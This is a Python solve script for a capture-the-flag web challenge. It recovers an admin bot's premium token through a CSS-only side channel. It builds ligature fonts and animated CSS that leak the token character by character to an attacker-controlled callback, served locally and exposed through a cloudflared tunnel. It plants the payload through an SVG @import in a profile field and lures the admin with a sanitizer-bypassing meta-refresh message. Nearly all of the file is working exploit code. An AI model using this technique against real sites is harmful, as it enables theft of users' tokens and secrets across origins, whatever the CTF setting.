#!/usr/bin/env python3
"""
LarpIn: recover the ADMIN's premium token with a CSS-only cross-origin read.

Two independent oracles per bot visit (two token-bearing elements on the admin's
view of our profile page), so we learn up to two characters per 70 s round trip.
Every recovered character is checkpointed to solve/state.json immediately, so an
instance lease boundary costs at most one round.

  A = script#viewer-premium-token          text is exactly TOKEN
  B = the inline window.__USER_CONFIG__    text contains  premiumToken: "TOKEN"

modes:
  len      A = length sweep (uniform font), B = next char
  scan     A = next char, B = the char after that (pair ligatures)
"""
import http.server
import json
import os
import random
import re
import string
import subprocess
import sys
import threading
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "scratch"))
import mkfont2 as mf  # noqa: E402

import requests  # noqa: E402

PORT = int(os.environ.get("PORT", "8891"))
ADMIN_ID = "1"
JOB = os.environ.get("JOB", "1")
PASSWORD = "Passw0rd!23"
URLFILE = os.path.expanduser("~/ctf-tools/LARPIN_URL.txt")
STATEF = os.path.join(HERE, "state.json")

CANDS = list(os.environ.get("CANDS",
             "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"))
STEP = 600
FS = 16
LEAD = 2.0
FRAME = float(os.environ.get("FRAME", "0.06"))
MAXLEN = int(os.environ.get("MAXLEN", "192"))

TOK_SEL = "script#viewer-premium-token"
CFG_SEL = "script:not([src]):not([type])"
CFG_PREFIX = 'premiumToken: "'

STATE = {"hits": {}, "css": {}}
LOCK = threading.Lock()


def base_url():
    d = json.load(open(URLFILE))["deploymentName"]
    return "https://%s.challs.ctf.thefewchosen.com" % d


def load():
    if os.path.exists(STATEF):
        return json.load(open(STATEF))
    return {"known": "", "length": None, "host": None}


def save(st):
    tmp = STATEF + ".tmp"
    json.dump(st, open(tmp, "w"), indent=1)
    os.replace(tmp, STATEF)


# --------------------------------------------------------------------------- css
def sweep(cb, tag, sel, font_uri, nbuckets, var):
    upx = STEP * FS / 1000.0
    frames = nbuckets + 1
    total = LEAD + FRAME * frames
    w0 = (nbuckets + 1.5) * upx
    segw = ["0%%,%.5f%%{width:%.3fpx}" % (100.0 * LEAD / total - 0.0005, w0)]
    segu = ['0%%,%.5f%%{%s:url("data:,")}' % (100.0 * LEAD / total - 0.0005, var)]
    for j in range(frames):
        a = 100.0 * (LEAD + FRAME * j) / total
        b = 100.0 * (LEAD + FRAME * (j + 1)) / total - 0.0005
        w = max((nbuckets - j + 0.5) * upx, 1.5)
        segw.append("%.5f%%,%.5f%%{width:%.3fpx}" % (a, b, w))
        segu.append('%.5f%%,%.5f%%{%s:url("%s/h/%s/%d")}' % (a, b, var, cb, tag, j))
    return """@property %(var)s{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@font-face{font-family:G%(tag)s;src:url(%(font)s)}
@keyframes w%(tag)s{%(segw)s}
@keyframes u%(tag)s{%(segu)s}
%(sel)s{display:block!important;font-family:G%(tag)s!important;font-size:%(fs)dpx!important;
line-height:%(fs)dpx!important;white-space:pre!important;overflow-x:auto!important;
overflow-y:hidden!important;height:%(h)dpx!important;font-variant-ligatures:common-ligatures!important;
container-type:scroll-state!important;color:transparent!important;
animation:w%(tag)s %(total).2fs steps(1,end) 1 both!important}
%(sel)s::after{content:""!important;display:block!important;width:1px!important;
height:1px!important;background-image:none;
animation:u%(tag)s %(total).2fs steps(1,end) 1 both!important}
@container scroll-state(scrollable: right){%(sel)s::after{background-image:var(%(var)s)}}
""" % {"tag": tag, "font": font_uri, "segw": "".join(segw), "segu": "".join(segu),
       "sel": sel, "fs": FS, "h": FS * 3, "total": total, "var": var}


def tick(cb, tag, total):
    n = 16
    seg = []
    for j in range(n):
        a = 100.0 * j / n
        b = 100.0 * (j + 1) / n - 0.0005
        seg.append('%.5f%%,%.5f%%{--v:url("%s/k/%s/%d")}' % (a, b, cb, tag, j))
    return """@property --v{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@keyframes k%(tag)s{%(seg)s}
html{background-image:url("%(cb)s/k/%(tag)s/ready")}
body::before{content:""!important;display:block!important;width:2px!important;
height:2px!important;background-image:var(--v);
animation:k%(tag)s %(total).2fs steps(1,end) 1 both!important}
""" % {"tag": tag, "seg": "".join(seg), "cb": cb, "total": total}


# ------------------------------------------------------------------------ server
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, body, ctype):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path
        parts = p.strip("/").split("/")
        if parts[0] in ("h", "k") and len(parts) >= 3:
            with LOCK:
                STATE["hits"].setdefault(parts[1], []).append(
                    (parts[0], parts[2], round(time.time(), 2)))
            return self._send(b"", "image/gif")
        if parts[0] == "c" and len(parts) >= 2:
            tag = parts[1].replace(".css", "")
            with LOCK:
                body = STATE["css"].get(tag, "/*none*/").encode()
            return self._send(body, "text/css")
        self._send(b"ok", "text/plain")


class TS(http.server.ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def start_tunnel(port):
    proc = subprocess.Popen(
        [os.path.expanduser("~/bin/cloudflared"), "tunnel", "--url", "http://127.0.0.1:%d" % port,
         "--no-autoupdate"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    url = None
    t0 = time.time()
    while time.time() - t0 < 90:
        line = proc.stdout.readline()
        if not line:
            break
        m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            break
    threading.Thread(target=lambda: [l for l in proc.stdout], daemon=True).start()
    return proc, url


# ------------------------------------------------------------------------ target
class Client:
    def __init__(self, base):
        self.base = base
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "Mozilla/5.0"

    def req(self, m, p, **kw):
        kw.setdefault("allow_redirects", False)
        kw.setdefault("timeout", 25)
        last = None
        for _ in range(6):
            try:
                return self.s.request(m, self.base + p, **kw)
            except Exception as e:  # noqa: BLE001
                last = e
                time.sleep(0.8)
        raise last


def fire(cb, tag, base):
    u = "z" + "".join(random.choice(string.ascii_lowercase + string.digits)
                      for _ in range(9))
    c = Client(base)
    c.req("POST", "/auth", data={"action": "register", "username": u,
                                 "full_name": u, "password": PASSWORD})
    r = c.req("POST", "/auth", data={"action": "login", "username": u,
                                     "password": PASSWORD})
    assert r.status_code == 302, r.status_code
    about = '<svg><style>@import url("%s/c/%s.css");</style></svg>' % (cb, tag)
    c.req("POST", "/profile/edit", data={"full_name": u, "headline": "SWE",
                                         "about": about, "experience": "x",
                                         "education": "x"})
    dm = '<met<meta zz>a http-equiv=refresh content<meta q>="0;url=/profile/%s">' % u
    c.req("POST", "/messages", data={"receiver_id": ADMIN_ID, "content": dm})
    c.req("POST", "/jobs/%s/apply" % JOB,
          data={"cover_letter": "Please review my profile."},
          files={"resume": ("cv.txt", b"hire me", "text/plain")})
    return u


def wait_hits(tags, timeout=140, quiet=8.0):
    t0 = time.time()
    seen = False
    while time.time() - t0 < timeout:
        with LOCK:
            allh = [h for t in tags for h in STATE["hits"].get(t, [])]
        if allh:
            seen = True
            if time.time() - max(h[2] for h in allh) > quiet:
                break
        time.sleep(0.5)
    with LOCK:
        return {t: list(STATE["hits"].get(t, [])) for t in tags}, seen


def first_bucket(hs):
    idx = sorted(int(v) for k, v, _ in hs if k == "h" and v.isdigit())
    return idx[0] if idx else None


def log(*a):
    print(time.strftime("[%H:%M:%S]", time.gmtime()), *a, flush=True)


# ------------------------------------------------------------------------ rounds
def main():
    srv = TS(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    proc, cb = start_tunnel(PORT)
    if not cb:
        raise SystemExit("no tunnel")
    log("callback", cb)
    time.sleep(4)

    st = load()
    rounds = int(os.environ.get("ROUNDS", "100"))
    for rn in range(rounds):
        base = base_url()
        st = load()
        known = st["known"]
        if st["length"] and len(known) >= st["length"]:
            log("DONE, token =", known)
            break
        ts = "%d" % int(time.time() * 10 % 10**7)
        tA, tB = "A" + ts, "B" + ts
        css = ""
        # OFF empty leading buckets: a real match can never land in the bottom
        # OFF frames, so a hit there's a font-load / layout artifact and is
        # rejected instead of being decoded as CANDS[0].
        OFF = int(os.environ.get("OFF", "4"))
        pad = [[] for _ in range(OFF)]
        if st["length"] is None or not known:
            fA = mf.data_uri(mf.build_uniform(STEP))
            nA = MAXLEN
            css += sweep(cb, tA, TOK_SEL, fA, nA, "--u1")
            kindA = "len"
        else:
            seqs = pad + [[known + c] for c in CANDS]
            fA = mf.data_uri(mf.build_graded_map(seqs, STEP))
            nA = len(seqs)
            css += sweep(cb, tA, TOK_SEL, fA, nA, "--u1")
            kindA = "char%d" % len(known)
        # B: the character after the one A is reading, via pair ligatures on the
        # inline config script.  Only enabled once we know the length.
        useB = st["length"] is not None and len(known) + 1 < st["length"]
        if os.environ.get("NOPAIR"):
            useB = False
        if st["length"] is None or os.environ.get("NOPAIR") or not known:
            seqs = pad + [[CFG_PREFIX + known + c] for c in CANDS]
            nB = len(seqs)
            fB = mf.data_uri(mf.build_graded_map(seqs, STEP))
            kindB = "char%d" % len(known)
            useB = False
        else:
            buckets = pad + [[CFG_PREFIX + known + c1 + c2 for c1 in CANDS]
                             for c2 in CANDS]
            nB = len(buckets)
            fB = mf.data_uri(mf.build_graded_map(buckets, STEP))
            kindB = "char%d" % (len(known) + 1)
        if useB or st["length"] is None or os.environ.get("NOPAIR"):
            css += sweep(cb, tB, CFG_SEL, fB, nB, "--u2")
        total = LEAD + FRAME * (max(nA, nB) + 1)
        css += tick(cb, tA, total)
        with LOCK:
            STATE["css"][tA] = css
            STATE["css"][tB] = css
        u = fire(cb, tA, base)
        log("round", rn, "known=%r" % known, "A=%s B=%s" % (kindA, kindB),
            "user", u, "css", len(css))
        hs, seen = wait_hits([tA, tB])
        ticks = sorted(int(v) for k, v, _ in hs[tA] if k == "k" and v.isdigit())
        jA, jB = first_bucket(hs[tA]), first_bucket(hs[tB])
        def dec(j, n):
            if j is None:
                return None
            k = n - j - OFF
            return CANDS[k] if 0 <= k < len(CANDS) else None

        cA = dec(jA, nA) if kindA != "len" else None
        cB = dec(jB, nB)
        log("  ticks", max(ticks) if ticks else None, "/15  jA", jA, "jB", jB,
            " A(%s)=%r B(%s)=%r" % (kindA, cA, kindB, cB))
        if st["length"] is None:
            if jA is not None:
                st["length"] = MAXLEN - jA + 1
                log("  LENGTH =", st["length"])
            if cB:
                st["known"] = known + cB
            save(st)
            continue
        got = ""
        if cA:
            got += cA
        elif cB and not useB:
            got += cB
        if got and useB and cB:
            got += cB
        if not got:
            log("  no read, retrying")
            continue
        st["known"] = known + got
        save(st)
        log("  +%r  TOKEN SO FAR (%d/%s): %s"
            % (got, len(st["known"]), st["length"], st["known"]))
    log("exit; state", json.load(open(STATEF)) if os.path.exists(STATEF) else None)


if __name__ == "__main__":
    main()
